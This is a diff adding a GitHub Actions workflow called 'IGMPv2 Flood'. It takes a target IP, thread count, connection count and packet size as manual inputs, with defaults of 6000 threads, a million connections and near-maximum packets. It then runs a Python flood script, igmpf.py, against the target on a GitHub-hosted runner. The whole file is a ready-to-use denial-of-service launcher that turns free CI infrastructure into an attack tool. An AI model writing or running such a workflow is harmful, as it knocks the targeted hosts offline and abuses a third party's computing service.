@@ -1,0 +1,39 @@
+name: IGMPv2 Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      iptgt:
+        description: "IP Target"
+        required: true
+      thread:
+        description: "Threads"
+        required: true
+        default: "6000"
+      conn:
+        description: "Multi-Connection"
+        required: true
+        default: "1000000"
+      ps:
+        description: "Packet Size"
+        required: true
+        default: "65507"
+      
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install socks pysocks
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+    - name: Starting Flood...
+      run: |
+        python igmpf.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.conn }} ${{ github.event.inputs.ps }}
